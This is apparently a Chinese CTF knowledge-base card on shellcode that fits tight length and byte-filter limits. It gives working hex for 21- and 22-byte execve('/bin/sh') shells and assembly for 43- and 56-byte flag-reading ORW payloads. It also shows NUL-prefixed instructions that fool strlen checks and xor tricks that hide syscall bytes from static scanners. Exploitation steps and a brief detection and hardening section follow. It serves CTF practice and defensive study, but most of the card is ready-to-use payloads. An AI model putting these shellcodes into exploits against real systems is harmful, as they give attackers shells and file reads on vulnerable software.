---
id: binary-pwn-sandbox-escape-minimal-shellcode-byte-budget-nul-free-scanf-badchar
title: 输入被长度/字节集双重限制时的最小 shellcode 预算表：21/22 字节 execve、43/56 字节 ORW、无 NULL 与 scanf 可读变体、前导 \x00 骗过 strlen、xor 现算 syscall 绕过 0f05 静态扫描
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: minimal-shellcode-byte-budget-badchar-encoding
aliases:
- 短字节 shellcode
- 最小 shellcode 长度预算
- 21 字节 execve
- 22 字节 execve
- 43 字节 orw
- 无 NULL 截断 shellcode
- scanf 可读取 shellcode
- \x00 截断绕过 strlen
- 禁用 0f05 绕过
- xor 构造 syscall
tags:
- pwn
- shellcode
- ctf
- badchars
- nul-free
- scanf
- strlen
- seccomp
- alpha3
- x86
- x86-64
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:32:06+08:00'
  notes: 已对照原文核对；32 位 21 字节 / 64 位 22 字节 execve 十六进制串、32 位 56 字节 ORW 汇编、64 位 43 字节 ORW 汇编、00 40 00 系列 strlen 绕过指令表与 xor 现算 syscall 片段均与正文逐字一致，shellcraft 66 字节基线的对比也有依据；本次核对未读取图片（原文 0 张图）；一处表述可再精确：正文 scanf 可读的 41 字节自解码串用 jmp short + pop esi 取址，卡片写作 call，原理结论不受影响；alpha3 具体生成串未照抄，正文 §5.4 浮点节本身无内容；未执行文中 shellcode 或 PoC
---

## 一句话结论

当题目对 shellcode 输入的「长度」和「字节集」同时设限时，先按目标功能（`execve` 还是 ORW）选一份已知最小长度、已知字节约束的现成编码入手，而不是从零写：32 位 `execve("/bin/sh")` 压到 21 字节、64 位压到 22 字节，32 位 ORW 约 56 字节、64 位约 43 字节；若过滤 `\x00`，用 `push imm32/imm64` 拼串并让立即数里不出现空字节；若程序用 `scanf("%s")` 一类函数读数，必须避开空白与 `\x00` 且保证解码器自洽（如 41 字节的自解码版本）；若长度检查用 `strlen`，在 shellcode 前面塞以 `\x00` 开头的三字节指令（如 `add byte ptr [rax], al`）让长度直接算成 0；若静态扫描禁止 `0x0f 0x05`，则用 `xor` 在运行时把目标字节现算出来写回指令流再执行。

## 原理

- **长度预算来自指令选择而非技巧**：`execve` 的最小形态依赖 `push imm32` 拼出 `/bin/sh`、用 `cdq`/`xor` 清零、`push 11/59; pop eax/rax` 设调用号；32 位 21 字节版本（`6a 0b 58 99 52 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 31 c9 cd 80`）把 `push 0xb; pop eax`、`cdq` 一次得到 `edx=0`，比 `xor edx,edx` 省一个字节。
- **ORW 的长度取决于能不能复用寄存器**：64 位 43 字节版本用 `push 0x67616c66`（"flag"）在栈上造文件名，随后 `rdi=rsp`、`open` 返回后把 `rax` 直接当 fd 传给 `read`，再 `mov edi,1` 复用 `rsi=rsp` 输出，全程不构造结构体，因此比 pwntools `shellcraft.open/read/write` 拼出的 66 字节短很多；32 位版本同理用 `push 0x1010101; xor dword ptr [esp], 0x1016660` 把 `"./fl"` 之类不规整的立即数补成可 push 的形式。
- **无 NULL 的构造原理**：`\x00` 出现在两种位置——立即数高位与寄存器清零指令。前者改用 `push imm32` 一次写满 4 字节（如 `push 0x68732f` / `push 0x6e69622f`，立即数本身不含 0），或先把值 `mov rbx, 0x68732f6e69622f` 再 `push rbx`；后者改用 `cdq`（用 `eax` 的符号位填 `edx`）或 `xor esi,esi` 之外的两字节替代，避免 `mov esi,0` 这类带三个空字节的编码。
- **scanf 可读的约束更严**：`scanf("%s")` 遇到空白、`\x0b`、`\x0c` 等就停止，且不会读入 `\x00`，因此可用字节集被限制到「非空白」；41 字节版本的核心是把 `/bin/sh` 放在解码器后面，用 `call` 把该字符串地址取到 `esi`，再在栈上原地解码出真正的 `execve` 代码，这样「构造过程」本身也不含被过滤的字节。
- **骗过 strlen**：`strlen` 在第一个 `0x00` 处停止。`add byte ptr [rax], al` 的编码是 `00 40 00`（`00 41 00`/`00 42 00`… 换寄存器），首字节即 `0x00`，其后两条字节仍属同一条指令，CPU 会正常执行（对 `[rax]` 做一次无损加法），但 `strlen` 只看到 0。也可以直接放 `\x00\x00`（`add [rax],al` 的两字节形态）——代价是必须保证 `[rax]` 可写。
- **绕开 `0x0f 0x05` 静态扫描**：扫描器只做字节匹配，不理解指令边界，所以把 `syscall` 的两个字节在运行时算出来即可：先把目标位置附近的内容 `xor` 上某个常数（例如把 `push 0x66666963; pop rsi` 得到的值 `xor` 到 `[rax+0x20]`），使该处字节在执行到它时恰好变成 `0f 05`，扫描阶段看到的则是无害字节。等价的另一条路是切到 i386 兼容模式改用 `int 0x80`（`cd 80` 不在扫描名单里）。
- **为什么「先选现成最短形态」是对的**：长度上限通常卡在 20-40 字节量级，靠自己逐条压指令极易在寄存器副作用上翻车（例如 `cdq` 会污染 `edx`、`pop rsp` 类技巧会破坏后续栈布局）；已知的最小形态都经过验证，只要确认入口寄存器状态与目标位数就能直接用，把剩余预算留给「绕过字节过滤」这一层。

## 触发条件

- 程序把输入读入可执行内存（RWX 页、`mprotect` 后的 BSS、或 JIT 缓冲）并直接跳转执行，或在 ROP 中使用 `jmp rsp` 进入 shellcode。
- 存在至少一种输入限制：单次 `read` 长度很小、`strlen`/`scanf("%s")` 长度检查、按字节黑白名单过滤（禁 `\x00`、禁 `\x0f\x05`、仅可打印字符）、或输入函数本身丢弃某些字节。
- 入口处寄存器状态已知（尤其是 `rsp` 是否指向 shellcode、`rax` 是否已被清零）；若无法确定，需先选对寄存器无依赖的形态。
- 目标位数与架构明确（32 位 `int 0x80` vs 64 位 `syscall`），且所选形态用到的 syscall 未被 seccomp 禁止。

## 利用步骤

1. 先用 `seccomp-tools dump ./pwn` 看清允许的 syscall 集合，决定用 `execve` 还是 ORW；再确认长度上限与字节过滤规则（读源码或盲目试探：提交含 `\x00` 的串看是否被截断、提交含空白的串看 `scanf` 是否提前结束）。
2. 按「功能 + 位数」挑基础形态：32 位 `execve` 21 字节；64 位 `execve` 22 字节；32 位 ORW 56 字节；64 位 ORW 43 字节。
3. 若禁 `\x00`：把 `mov reg, imm` 清零换成 `cdq`/`xor reg,reg`，把字符串改成 `push imm32` 两段拼；比对最终字节确认无 `0x00`。
4. 若走 `scanf`：改用自解码形态，把 `/bin/sh` 尾随在解码器之后（`call` 取址），并确保整段不含空白字节。
5. 若长度检查用 `strlen` 且需要更长代码：在开头插入 `00 40 00` 一类三字节空字节指令，让长度判定为 0，真实代码紧随其后。
6. 若静态扫描禁 `0x0f 0x05`：改成运行时 `xor` 现算，或改用 `int 0x80` 的 i386 兼容路径；先在本地用相同扫描逻辑自测提交的字节串。
7. 发送后用交互式 shell 或回显验证；失败时优先怀疑入口寄存器假设（`rsp` 是否指向 payload、`rax` 是否为 0）而不是编码本身。

## PoC

32 位 `execve("/bin/sh", NULL, NULL)`，21 字节（无 NULL）：

```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

64 位 `execve`，22 字节（无 NULL，`scanf` 亦可读）：

```
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```

32 位 ORW（约 56 字节，`push` + `xor` 就地补串）：

```asm
push 0x1010101
xor  dword ptr [esp], 0x1016660     /* 把 "...." 修成 "./fl" 一类 */
push 0x6c662f2e
mov  eax, 5
mov  ebx, esp
xor  ecx, ecx
int  0x80
mov  ebx, eax
mov  ecx, esp
mov  edx, 0x30
mov  eax, 3
int  0x80
mov  ebx, 1
mov  eax, 4
int  0x80
```

64 位 ORW（约 43 字节）：

```asm
push 0x67616c66        /* "flag" */
mov  rdi, rsp
xor  esi, esi
push 2
pop  rax
syscall
mov  rdi, rax
mov  rsi, rsp
mov  edx, 0x100
xor  eax, eax
syscall
mov  edi, 1
mov  rsi, rsp
push 1
pop  rax
syscall
```

`strlen` 前导空字节绕过（三字节即得长度 0，`[rax]` 需可写）：

```
00 40 00     add BYTE PTR [rax+0x0], al
00 41 00     add BYTE PTR [rcx+0x0], al
00 42 00     add BYTE PTR [rdx+0x0], al
```

禁 `0x0f 0x05` 时用 `xor` 现算 `syscall` 的思路（长度受限版本）：

```asm
push 0x66666963
pop  rsi
xor  qword ptr [rax + 0x20], rsi   /* 运行时把目标字节改成 0f 05 */
push rbx
pop  rdi
xor  al, 0x22
push rax
pop  rsi
push 0x66666963
pop  rdx
```

## 变体与关联

- 长度更紧（<20 字节）：走分段加载，用一次 `read` 覆盖自身再回跳，见 [[binary-pwn-sandbox-escape-tiny-shellcode-read-self-loop-staging]]；或借残留寄存器（如 `xmm7` 里的 libc 地址）省掉取址指令。
- 只能输入可见字符：用 ALPHA3 生成字母数字 shellcode，注意生成时指定的基址寄存器（`rax`/`eax`/`rdi`）在跳转瞬间必须等于 shellcode 地址，见 [[binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw]]。
- 禁 `syscall` 而非禁输入字节：除本文的 `xor` 现算，还可自修改 `0x0e` 为 `0x0f`，见 [[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]；或 `retfq` 切 i386 用 `int 0x80`，见 [[binary-pwn-sandbox-escape-orw-missing-open-openat-retfq-i386-open]]。
- 只限长度但不禁内容：优先用 pwntools `shellcraft` 生成再人工压缩（32 位 ORW 55 字节 / 64 位 66 字节是未压缩基线，压缩后 43 字节量级）。
- 关联：[[binary-pwn-sandbox-escape-strlen-null-truncate-shuffle-seccomp-orw]]（`strlen` + 洗牌场景下的空字节利用）。

## 检测与防御

- **出题侧/加固侧**：长度检查不要用 `strlen`（应先固定读取长度再校验，或统计实际读入字节数）；输入过滤要按「解码后的可执行内容」而非原始字节判断，或直接把执行页设为不可写（W^X）；静态扫描 `0x0f 0x05` 只能提高门槛，需配合 seccomp 在运行时真正拦 syscall。
- **运行时**：seccomp 白名单按功能最小化，同时校验 `arch` 与 syscall 号（否则 32 位兼容路径可绕过）；对可执行页做 `PROT_EXEC` 之外的写保护，触发 `mprotect` 告警。
- **检测特征**：提交内容含以 `0x00` 开头的合法指令（`00 40 00` 形态）、含 `push imm32` 拼串特征、长度极短但包含 `int 0x80`/`syscall` 字节、或存在自修改写回代码段的指令（`xor [reg+off], reg`）。
